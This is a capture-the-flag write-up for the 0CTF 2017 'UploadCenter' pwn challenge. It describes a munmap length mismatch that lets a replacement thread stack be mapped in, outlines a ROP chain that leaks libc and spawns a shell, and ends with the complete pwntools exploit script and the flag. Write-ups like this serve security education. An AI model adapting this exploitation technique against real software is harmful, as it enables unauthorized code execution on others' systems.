---
layout: post
title: "0CTF 2017 Quals: UploadCenter (pwn, 523pts)"
modified: 2017-03-21
tags: 0ctf, 0ctf2017quals, pwn
---

After reversing the binary it turned out the structure of the challenge is the usual menu system based pwn challenge.

We had the following menus:
 - "1 :) Fill your information"
   - It reads your team name to a 20 byte buffer and prints it out. It can be used to leak data from stack if you don't fill the 20 byte buffer. For example it can be used to leak the heap base address. But we never used this vulnerability in the final exploit.
 - "2 :) Upload and parse File"
   - This is where the main functionality lies: you can upload a zlib-compressed PNG image, it will parse its headers, allocate a **width\*height-sized buffer with mmap**, and copies the content into it (but limits the size to the buffer length, so it does not cause overflow). It also puts various metadata into a linked list about these uploaded files, including the decompressed content's size.
 - "3 :) Show File info"
   - Prints out the width, height and "pixels" (bit depth) properties of the chosen file. Not used in the exploit.
 - "4 :) Delete File"
   - Deletes a selected file. Munmaps its content (based on the decompressed content's length), frees it's metadata and unlinks the item from the linked list. We will use the munmap in the exploit.
 - "5 :) Commit task"
   - Creates a thread which prints out every file's width, height, bit depth. You can only call this method six times. Not used in the exploit, probably just a red herring :)
 - "6 :) Monitor File"
   - Create a thread which notifies you if a new file was uploaded. It uses a conditional variable (and mutex) to block until the main thread notifies it.
 - 8 - a hidden "backdoor"
   - It's a gets-based stack overflow, but exits immediately after it overwrites the stack. Although the deinitialization logic runs in the exit call, the stack overflow is still not exploitable this way. It's obviously there just for misleading us.
   
There are a few misleading / non-exploitable functionality (including the whole PNG parsing), but there is something fishy going on with the content length calculation when it allocates the buffer based on the width and height instead of the decompressed content length.

Also despite that the PNG is a compressed file format, there is an additional layer of compression which is a hint about that we may have to send a lot of data. As we will see later, our hunch was not unfounded.

If we take a closer look at the buffer allocation, it turns out fast that the  allocation size and the length used for munmap can differ.

This is exactly the same situation that my teammate **tukan** described in [one of his ptmalloc fanzine back in 2016](http://tukan.farm/2016/07/27/munmap-madness/), so he could point us into the correct direction right away.

Although the next mapped memory segment after our mmap'd allocation is either the read-only data section of the libc or the guard page before the stack of a thread created by either the 5th or 6th menu item, the munmap can remove them if we use a bigger length than the original allocation was.

So our plan is the following:
 - create a long-running thread (with 6th menu item), which will mmap a thread stack (the size is architecture dependent, but was 8MB on x64).
 - the thread waits for the condition variable until we upload a new file
 - upload a file whose decompressed length is bigger than the allocation size, so munmap will remove the following mmap'd segment too
   - I used the following values: width = 1024, height = 1024, width * height = 1MB, decompressed length = 9MB (1MB my content + 8MB overflow into the thread's stack)
 - delete this file with the 4th menu item
   - although the thread's stack is unmapped, the thread won't wake up, so this won't cause any problem (segmentation fault for example)
 - upload a new, fake thread stack (8MB), and putting a ROP chain in the place of the original stack where the execution returns
   - we also have to restore a few variables (like mutex and cond) so the waking up thread won't crash immediately or behave incorrectly
 - the ROP chain does the following:
   - leaks libc address (puts in our case)
   - unlocks the mutex, so the main thread won't block anymore
   - make the thread sleep forever, so its broken state won't cause any problems for us (for example race condition)
 - we calculate the address of one of the one-gadget-RCEs ([thanks to david942j for his tool](https://github.com/david942j/one_gadget))
   - calling system did not work for me, probably something broke meanwhile
 - we repeat everything from the beginning, but this time we call the one-gadget-RCE in the ROP chain

Executing our plan actually worked and give us a shell.
 
We found the flag in the /home/uploadcenter/flag file:

{% highlight text %}
flag{M3ybe_Th1s_1s_d1ffer3nt_UAF_Y0U_F1rst_S33n}
{% endhighlight %}

Below the whole exploit:

{% highlight python %}
#!/usr/bin/env python2
from pwn import *
import time
import zlib

REMOTE = True

def readMenu():
    print '\n'.join([' < '+x for x in p.recvuntil('1 :) Fill your information', drop=True).strip().split('\n')])
    p.recvuntil('6 :) Monitor File\n')

skipReadMenu = False
    
def cmd(cmdIdx):
    global skipReadMenu
    if skipReadMenu:
        skipReadMenu = False
    else:
        readMenu()
    print '> cmd: %d' % cmdIdx
    p.sendline(str(cmdIdx))
    
def fillInfo(teamName, memberCount):
    cmd(1)
    p.sendlineafter('Your team name : ', teamName)
    p.sendlineafter('Member count : ', str(memberCount))
    
def upload(data):
    cmd(2)
    p.send(p32(len(data)))
    p.send(data)
    
def showFileInfo(fileId):
    cmd(3)
    p.sendlineafter('which file you want to show ?', str(fileId))

def delete(fileId):
    cmd(4)
    p.sendlineafter('which file you want to delete ?', str(fileId))
    
def commitTask():
    cmd(5)
    
def monitorFile():
    cmd(6)

def genPngEx(width, height, colorType, bitDepth, chunks):
    # must be zero, otherwise won't parse png
    comprMethod = 0
    filterMethod = 0
    interlaceMethod = 0

    ihdrLen = 13 # not checked
    with context.local(endian='big'):
        res = '\x89PNG\r\n\x1A\n' + p32(ihdrLen) + 'IHDR' + p32(width) + p32(height) +\
            chr(bitDepth) + chr(colorType) + chr(comprMethod) + chr(filterMethod) + chr(interlaceMethod) + 'A'*4 # crc
        
        for chunk in chunks:
            res += p32(chunk['size']) + 'IDAT' + chunk['data'] + 'A'*4 # crc
            
        res += p32(0) + 'IEND' + 'A'*4 # crc
    
    return res
    
def genPng(width, height, chunks):
    return genPngEx(width, height, 2, 8, [{'size': len(x), 'data': x} for x in chunks])

if REMOTE:
    p = remote("202.120.7.216", 12345)
else:
    p = process('./uploadcenter')
    time.sleep(1)

mutex = 0x60E160
cond = 0x60E1A0
popRdiRet = 0x4038B1
puts = 0x400AF0
gotPuts = 0x60E028
sleep = 0x400C30
mutexUnlock = 0x400BB0

def rop(ropchain, stage2):
    global skipReadMenu
    
    monitorFile()
    p.recvuntil('I will remind you')
    skipReadMenu = True

    delSize = 9*1024*1024# - 8*4096
    print 'delete size = %d' % delSize
    png = genPng(1024, 1024, ['A'*(delSize)])
    print 'payload length = %d' % len(png)
    upload(zlib.compress(png))

    p.recvuntil('New file uploaded, Please check')
    skipReadMenu = True

    delete(1 if stage2 else 0)
    split = 4393

    readMenu()
    skipReadMenu = True

    payload = 'C'*8 + p64(cond) + p64(mutex) + 'F'*8 + 'G'*8 + ropchain + '\0'*(split-8*5-len(ropchain))
    upload(zlib.compress(genPng(8*1024, 1024, ['A'*(8*1024*1024-split) + payload])))

ropchain = \
    p64(popRdiRet) + p64(gotPuts) + p64(puts) +\
    p64(popRdiRet) + p64(mutex) + p64(mutexUnlock) +\
    p64(popRdiRet) + p64(60) + p64(sleep)

rop(ropchain, False)
    
p.recvuntil('byte data\n')
gotLeak = p.recvline()
print 'gotLeak = %r' % gotLeak
if gotLeak.startswith('1 :) Fill your'):
    p.recvuntil('6 :) Monitor File\n')
    gotLeak = p.recvline()

print 'gotLeak = %r' % gotLeak
putsLibc = u64(gotLeak.strip().ljust(8, '\0'))
print 'putsLibc = %016x' % putsLibc

if REMOTE:
    p.sendline('')
    libcBase = putsLibc - 0x7ffff787f990 + 0x7ffff7814000
    oneGadget = libcBase + 0x41374
else:
    system = putsLibc - 0x7ffff7860690 + 0x7ffff7836390 # local ubuntu
    libcBase = putsLibc - 0x7ffff7860690 + 0x7ffff77f1000 # local ubuntu
    oneGadget = libcBase + 0x4526a # local ubuntu

rop(p64(oneGadget), True)

p.interactive()
{% endhighlight %}